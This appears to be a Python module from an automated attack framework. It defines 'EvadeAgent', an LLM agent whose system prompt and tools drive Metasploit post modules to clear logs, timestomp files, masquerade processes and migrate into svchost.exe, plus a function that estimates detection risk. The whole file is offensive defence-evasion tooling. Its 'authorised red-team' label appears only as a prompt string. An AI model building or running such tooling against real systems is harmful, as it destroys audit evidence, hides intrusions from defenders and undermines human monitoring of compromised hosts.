from __future__ import annotations
import requests
from typing import Any, Dict, List, Optional, Tuple
from agents.base import BaseAgent
from mdp.state import AttackState


EVADE_SYSTEM_PROMPT = """
You are EvadeAgent operating within an authorised red-team evaluation. Your role is to suppress
observable indicators of compromise before and after exploitation and lateral movement.
Query D3FEND to identify active mitigations, then select and apply counter-evasion techniques
from MITRE ATT&CK Defence Evasion tactic: process injection (T1055), timestomping (T1070.006),
log clearing (T1070.001), masquerading (T1036). Prioritise actions that reduce the defensive
posture vector components most likely to trigger alerts.
"""


class EvadeAgent(BaseAgent):
    def __init__(self, llm_config, exec_config, memory, msf_client) -> None:
        self._msf = msf_client
        super().__init__(
            name="EvadeAgent",
            system_prompt=EVADE_SYSTEM_PROMPT,
            llm_config=llm_config,
            exec_config=exec_config,
            memory=memory,
        )

    def _register_tools(self) -> None:
        self.tools.register(
            name="query_d3fend",
            fn=self._query_d3fend,
            schema={
                "name": "query_d3fend",
                "description": "Query MITRE D3FEND to retrieve active defensive techniques for a given ATT&CK technique.",
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "attack_technique_id": {"type": "string"},
                    },
                    "required": ["attack_technique_id"],
                },
            },
        )
        self.tools.register(
            name="apply_evasion",
            fn=self._apply_evasion,
            schema={
                "name": "apply_evasion",
                "description": "Apply an evasion technique on a target host via an active session.",
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "technique_id": {"type": "string"},
                        "session_id": {"type": "string"},
                        "target_host": {"type": "string"},
                    },
                    "required": ["technique_id", "session_id"],
                },
            },
        )
        self.tools.register(
            name="inject_process",
            fn=self._inject_process,
            schema={
                "name": "inject_process",
                "description": "Perform process injection (T1055) to migrate to a trusted process.",
                "input_schema": {
                    "type": "object",
                    "properties": {
                        "session_id": {"type": "string"},
                        "target_pid": {"type": "integer"},
                        "target_process": {"type": "string"},
                    },
                    "required": ["session_id"],
                },
            },
        )

    def _query_d3fend(self, attack_technique_id: str) -> Dict:
        url = "https://d3fend.mitre.org/api/offensive-technique/attack-id/"
        try:
            resp = requests.get(f"{url}{attack_technique_id}.json", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                defenses = [
                    d.get("def-tech-label", {}).get("value", "")
                    for d in data.get("def_tech_list", {}).get("bindings", [])
                ]
                return {"technique": attack_technique_id, "defenses": defenses}
            return {"error": f"HTTP {resp.status_code}"}
        except requests.RequestException as exc:
            return {"error": str(exc)}

    def _apply_evasion(
        self,
        technique_id: str,
        session_id: str,
        target_host: Optional[str] = None,
    ) -> Dict:
        technique_module_map = {
            "T1055": "post/multi/manage/shell_to_meterpreter",
            "T1070.001": "post/multi/manage/clearlogs",
            "T1070.006": "post/windows/manage/timestomp",
            "T1036": "post/windows/manage/masquerade",
        }
        module = technique_module_map.get(technique_id)
        if not module:
            return {"error": f"No module mapped for {technique_id}"}
        result = self._msf.run_post_module(
            session_id=session_id,
            module=module,
            options={},
        )
        return {"technique": technique_id, "result": result}

    def _inject_process(
        self,
        session_id: str,
        target_pid: Optional[int] = None,
        target_process: str = "svchost.exe",
    ) -> Dict:
        options = {"NAME": target_process}
        if target_pid:
            options["PID"] = str(target_pid)
        result = self._msf.run_post_module(
            session_id=session_id,
            module="post/multi/manage/migrate",
            options=options,
        )
        return {"injected_into": target_process, "result": result}

    def run(self, state: AttackState, task: str) -> Tuple[bool, str, Any]:
        success, steps, result = self._react_loop(state, task)
        return success, "\n".join(s.observation for s in steps), result

    def estimate_detection_probability(
        self,
        technique_id: str,
        defense_posture: float,
    ) -> float:
        base_rates = {
            "T1055": 0.25,
            "T1070.001": 0.15,
            "T1070.006": 0.10,
            "T1036": 0.20,
        }
        base = base_rates.get(technique_id, 0.30)
        return min(base * (1.0 + defense_posture), 0.95)


from typing import Optional
